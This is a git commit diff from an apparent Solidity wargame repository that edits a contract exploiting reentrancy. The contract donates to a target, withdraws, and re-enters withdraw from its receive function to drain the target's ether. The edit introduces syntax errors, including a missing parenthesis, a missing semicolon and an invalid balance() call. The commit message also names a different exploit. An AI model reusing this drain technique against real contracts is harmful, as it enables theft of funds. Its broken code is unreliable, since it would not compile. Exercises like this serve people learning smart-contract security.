6e97a1457edbdab5fbae60950f1eeb48d272bca4
Will McTighe <will@mctighe.net>
2022-07-07 14:57:23 +0100

    update king exploit

--- contracts/6. Reentrance/AttackingReentrance.sol
+++ contracts/6. Reentrance/AttackingReentrance.sol
@@ -6,18 +6,18 @@ contract AttackingReentrance {
     Reentrance private reentrance;
 
     constructor(address payable _contractAddress) payable {
-        reentrance = Reentrance(_contractAddress);
+        reentrance = Reentrance(_contractAddress;
     }
 
     function hackContract() external {
-        // must use 1 rather than 1 ether given test
         reentrance.donate{value: 1}(address(this));
-        reentrance.withdraw();
+        reentrance.withdraw()
     }
 
     receive() external payable {
-        if (address(reentrance).balance >= 1) {
+        if (address(reentrance).balance() > 1) {
             reentrance.withdraw();
         }
     }
+        
 }
